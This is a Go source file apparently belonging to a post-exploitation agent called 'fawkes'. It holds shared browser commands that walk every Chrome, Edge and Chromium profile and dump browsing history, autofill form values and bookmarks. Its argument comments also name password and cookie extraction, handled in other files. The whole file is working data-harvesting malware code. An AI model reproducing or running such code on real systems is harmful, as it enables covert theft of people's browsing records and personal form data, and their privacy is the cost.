package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// Shared browser command types and helpers used by both Windows and non-Windows.

type browserArgs struct {
	Action  string `json:"action"`  // passwords (default), cookies, history, autofill, bookmarks
	Browser string `json:"browser"` // all (default), chrome, edge, chromium
}

type browserBookmarkEntry struct {
	Browser string
	Name    string
	URL     string
	Folder  string
}

type bookmarkNode struct {
	Type     string         `json:"type"`
	Name     string         `json:"name"`
	URL      string         `json:"url"`
	Children []bookmarkNode `json:"children"`
}

func extractBookmarks(node *bookmarkNode, browser, folder string, out *[]browserBookmarkEntry) {
	if node.Type == "url" && node.URL != "" {
		*out = append(*out, browserBookmarkEntry{
			Browser: browser,
			Name:    node.Name,
			URL:     node.URL,
			Folder:  folder,
		})
	}
	for i := range node.Children {
		childFolder := folder
		if node.Children[i].Type == "folder" {
			childFolder = folder + "/" + node.Children[i].Name
		}
		extractBookmarks(&node.Children[i], browser, childFolder, out)
	}
}

// chromeTimeToString converts a Chrome/Chromium timestamp to a human-readable UTC string.
// Chrome uses two epoch formats:
// - History/cookies: microseconds since 1601-01-01 (very large numbers, >10^16)
// - Autofill: seconds since Unix epoch (smaller numbers, ~10^9)
// This function auto-detects based on magnitude.
func chromeTimeToString(ts int64) string {
	if ts <= 0 {
		return "never"
	}
	const chromeToUnixMicros = 11644473600000000
	if ts > 1e13 {
		unixMicros := ts - chromeToUnixMicros
		if unixMicros < 0 {
			return "unknown"
		}
		t := time.Unix(unixMicros/1000000, (unixMicros%1000000)*1000)
		return t.UTC().Format("2006-01-02 15:04:05")
	}
	t := time.Unix(ts, 0)
	return t.UTC().Format("2006-01-02 15:04:05")
}

// findProfilesWithFile returns Chromium profile directories containing the given file.
func findProfilesWithFile(userDataDir string, relPath string) []string {
	var profiles []string

	check := func(dir string) {
		if _, err := os.Stat(filepath.Join(dir, relPath)); err == nil {
			profiles = append(profiles, dir)
		}
	}

	check(filepath.Join(userDataDir, "Default"))

	entries, err := os.ReadDir(userDataDir)
	if err != nil {
		return profiles
	}
	for _, entry := range entries {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
			check(filepath.Join(userDataDir, entry.Name()))
		}
	}

	return profiles
}

// browserHistory extracts browsing history from Chromium-based browsers.
// Calls platform-specific browserPaths() and openBrowserDB().
func browserHistory(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine browser data paths")
	}

	type historyEntry struct {
		Browser    string
		URL        string
		Title      string
		VisitCount int
		LastVisit  string
	}

	var allEntries []historyEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		profiles := findProfilesWithFile(userDataDir, "History")
		if len(profiles) == 0 {
			continue
		}

		for _, profileDir := range profiles {
			dbPath := filepath.Join(profileDir, "History")
			profileName := filepath.Base(profileDir)

			db, cleanup, err := openBrowserDB(dbPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			rows, err := db.Query("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500")
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
				cleanup()
				continue
			}

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rows.Next() {
				var url, title string
				var visitCount int
				var lastVisitTime int64

				if err := rows.Scan(&url, &title, &visitCount, &lastVisitTime); err != nil {
					continue
				}

				lastVisit := chromeTimeToString(lastVisitTime)

				allEntries = append(allEntries, historyEntry{
					Browser:    label,
					URL:        url,
					Title:      title,
					VisitCount: visitCount,
					LastVisit:  lastVisit,
				})
			}
			rows.Close()
			cleanup()
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser History (%d entries) ===\n\n", len(allEntries)))

	for _, e := range allEntries {
		title := e.Title
		if title == "" {
			title = "(no title)"
		}
		sb.WriteString(fmt.Sprintf("[%s] %s\n  %s  (visits: %d, last: %s)\n",
			e.Browser, truncStr(title, 80), truncStr(e.URL, 120), e.VisitCount, e.LastVisit))
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return successResult(sb.String())
}

// browserAutofill extracts autofill form data from Chromium-based browsers.
func browserAutofill(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine browser data paths")
	}

	type autofillEntry struct {
		Browser      string
		FieldName    string
		Value        string
		Count        int
		DateLastUsed string
	}

	var allEntries []autofillEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		profiles := findProfilesWithFile(userDataDir, "Web Data")
		if len(profiles) == 0 {
			continue
		}

		for _, profileDir := range profiles {
			dbPath := filepath.Join(profileDir, "Web Data")
			profileName := filepath.Base(profileDir)

			db, cleanup, err := openBrowserDB(dbPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			rows, err := db.Query("SELECT name, value, count, date_last_used FROM autofill ORDER BY date_last_used DESC LIMIT 500")
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
				cleanup()
				continue
			}

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rows.Next() {
				var name, value string
				var count int
				var dateLastUsed int64

				if err := rows.Scan(&name, &value, &count, &dateLastUsed); err != nil {
					continue
				}

				lastUsed := chromeTimeToString(dateLastUsed)

				allEntries = append(allEntries, autofillEntry{
					Browser:      label,
					FieldName:    name,
					Value:        value,
					Count:        count,
					DateLastUsed: lastUsed,
				})
			}
			rows.Close()
			cleanup()
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser Autofill (%d entries) ===\n\n", len(allEntries)))

	for _, e := range allEntries {
		sb.WriteString(fmt.Sprintf("[%s] %s = %s  (used: %d times, last: %s)\n",
			e.Browser, e.FieldName, truncStr(e.Value, 60), e.Count, e.DateLastUsed))
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return successResult(sb.String())
}

// browserBookmarks extracts bookmarks from Chromium-based browsers.
func browserBookmarks(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine browser data paths")
	}

	var allBookmarks []browserBookmarkEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		profiles := findProfilesWithFile(userDataDir, "Bookmarks")
		if len(profiles) == 0 {
			continue
		}

		for _, profileDir := range profiles {
			bmPath := filepath.Join(profileDir, "Bookmarks")
			profileName := filepath.Base(profileDir)

			data, err := os.ReadFile(bmPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			var bmFile struct {
				Roots map[string]json.RawMessage `json:"roots"`
			}
			if err := json.Unmarshal(data, &bmFile); err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): parse: %v", browserName, profileName, err))
				continue
			}

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rootName, raw := range bmFile.Roots {
				if len(raw) == 0 || raw[0] != '{' {
					continue
				}
				var node bookmarkNode
				if err := json.Unmarshal(raw, &node); err != nil {
					continue
				}
				extractBookmarks(&node, label, rootName, &allBookmarks)
			}
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser Bookmarks (%d found) ===\n\n", len(allBookmarks)))

	for _, b := range allBookmarks {
		sb.WriteString(fmt.Sprintf("[%s] [%s] %s\n  %s\n",
			b.Browser, b.Folder, truncStr(b.Name, 80), truncStr(b.URL, 120)))
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return successResult(sb.String())
}
